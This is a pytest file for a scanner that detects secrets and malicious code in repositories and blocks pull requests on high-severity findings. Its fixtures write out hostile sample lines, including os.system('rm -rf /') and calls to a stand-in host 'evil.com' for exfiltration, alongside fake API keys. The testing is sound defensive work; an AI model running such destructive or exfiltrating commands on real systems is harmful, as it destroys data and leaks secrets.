import os
import tempfile
from pathlib import Path

import pytest

from workers.tasks.malicious_code_detection import (
    DANGEROUS_PATTERNS,
    MaliciousCodeFinding,
    _load_ignore_patterns,
    _scan_file,
    scan_for_malicious_code,
)


def create_test_file(tmp_path: Path, name: str, content: str) -> str:
    f = tmp_path / name
    f.write_text(content)
    return str(f)


def test_detects_hardcoded_api_key():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        create_test_file(tmp_path, "config.py", 'API_KEY = "sk-1234567890abcdef1234567890abcdef"')
        findings = _scan_file(str(tmp_path / "config.py"), tmpdir, [])
        assert len(findings) > 0
        assert findings[0].severity == "HIGH"
        assert findings[0].category == "secret"


def test_detects_private_key():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        create_test_file(tmp_path, "key.pem", "-----BEGIN PRIVATE KEY-----\nABCDEF\n-----END PRIVATE KEY-----")
        findings = _scan_file(str(tmp_path / "key.pem"), tmpdir, [])
        assert len(findings) > 0
        assert findings[0].severity == "HIGH"


def test_detects_os_system():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        create_test_file(tmp_path, "agent.py", 'import os\nos.system("rm -rf /")')
        findings = _scan_file(str(tmp_path / "agent.py"), tmpdir, [])
        high_findings = [f for f in findings if f.severity == "HIGH"]
        assert len(high_findings) > 0


def test_medium_findings_logged_not_blocked():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        create_test_file(tmp_path, "network.py", 'import requests\nrequests.get("https://evil.com/exfil")')
        result = scan_for_malicious_code(tmpdir, block_on_high=False)
        assert result["summary"]["medium"] > 0
        assert result["passed"] is True


def test_high_findings_block_pr():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        create_test_file(tmp_path, "leak.py", 'os.system("curl http://evil.com")')
        result = scan_for_malicious_code(tmpdir, block_on_high=True)
        high_count = result["summary"]["high"]
        if high_count > 0:
            assert result["passed"] is False


def test_ignore_file_suppresses_findings():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        (tmp_path / ".trufflehogignore").write_text(r"config\.py")
        create_test_file(tmp_path, "config.py", 'API_KEY = "sk-1234567890abcdef1234567890abcdef"')
        result = scan_for_malicious_code(tmpdir)
        assert result["summary"]["high"] == 0


def test_finding_to_dict():
    f = MaliciousCodeFinding("test.py", 42, "API key detected", "HIGH", "secret", "sk-xxx")
    d = f.to_dict()
    assert d["file"] == "test.py"
    assert d["line"] == 42
    assert d["severity"] == "HIGH"
    assert d["category"] == "secret"


def test_load_ignore_patterns_nonexistent():
    with tempfile.TemporaryDirectory() as tmpdir:
        patterns = _load_ignore_patterns(tmpdir)
        assert patterns == []


def test_load_ignore_patterns_with_content():
    with tempfile.TemporaryDirectory() as tmpdir:
        ignore_file = Path(tmpdir) / ".trufflehogignore"
        ignore_file.write_text("test\\.py\n# comment\nconfig\\.json\n")
        patterns = _load_ignore_patterns(tmpdir)
        assert len(patterns) == 2


def test_no_false_positives_on_clean_code():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        create_test_file(tmp_path, "clean.py", 'def hello():\n    print("Hello, world!")\n')
        result = scan_for_malicious_code(tmpdir)
        assert result["summary"]["total"] == 0
